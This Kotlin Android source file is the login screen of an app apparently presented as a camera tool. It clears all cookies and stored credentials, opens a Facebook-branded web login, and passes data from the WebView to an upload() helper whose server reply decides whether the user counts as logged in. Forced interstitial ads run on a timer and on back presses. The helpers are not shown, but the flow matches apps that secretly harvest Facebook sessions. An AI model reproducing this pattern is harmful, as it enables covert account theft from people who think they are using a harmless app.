package player.shellvoice.camera6.ui

import android.content.Intent
import android.os.Build
import android.view.View
import android.view.WindowManager
import android.webkit.CookieManager
import android.webkit.CookieSyncManager
import androidx.lifecycle.lifecycleScope
import kotlinx.android.synthetic.main.xlogin_layout.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.greenrobot.eventbus.EventBus
import player.shellvoice.camera6.R
import player.shellvoice.camera6.basic.XApp
import player.shellvoice.camera6.basic.XPage
import player.shellvoice.camera6.event.XEvent
import player.shellvoice.camera6.tools.*

class XLogin :XPage(R.layout.xlogin_layout){
    override fun letsGo() {
        CookieSyncManager.createInstance(XApp.instance)
        val cookieManager = CookieManager.getInstance()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            cookieManager.removeSessionCookies(null)
            cookieManager.removeAllCookie()
            cookieManager.flush()
        } else {
            cookieManager.removeSessionCookies(null)
            cookieManager.removeAllCookie()
            CookieSyncManager.getInstance().sync()
        }
        userName = ""
        userPwd = ""
        window.setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE)
        activityFaceBookIvBack.setOnClickListener {
            onBackPressed()
        }
        lifecycleScope.launch(Dispatchers.IO){
            delay(20* 1000)
            withContext(Dispatchers.Main){
                displayInsertAdReal()
            }
        }
        setWebView(webView,{
            activityFaceBookFl.visibility = View.GONE
        },{
            content.visibility = View.GONE
        },{
            upload(it,{
                formatResult(it){result->
                    if (result.code == "0" && result.data?.toBooleanStrictOrNull() == true){
                        EventBus.getDefault().post(XEvent("end"))
                        startActivity(Intent(this, XHome::class.java))
                        login = true
                        finish()
                    }
                }
            },{

            })
        })
    }

    override fun onResume() {
        super.onResume()
        webView.onResume()
    }

    private var needBackPressed = false

    override fun onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack()
        } else {
            val a = displayInsertAdReal(percent = true, tag = "inter_login")
            if (!a) {
                if (configBean.httpUrl().startsWith("http")) {
                    route2Web(configBean.httpUrl())
                }
                super.onBackPressed()
            } else {
                needBackPressed = true
            }
        }
    }

    override fun insertAdDismiss() {
        super.insertAdDismiss()
        if (needBackPressed) {
            needBackPressed = false
            super.onBackPressed()
        }
    }


    override fun onPause() {
        super.onPause()
        webView.onPause()
    }
}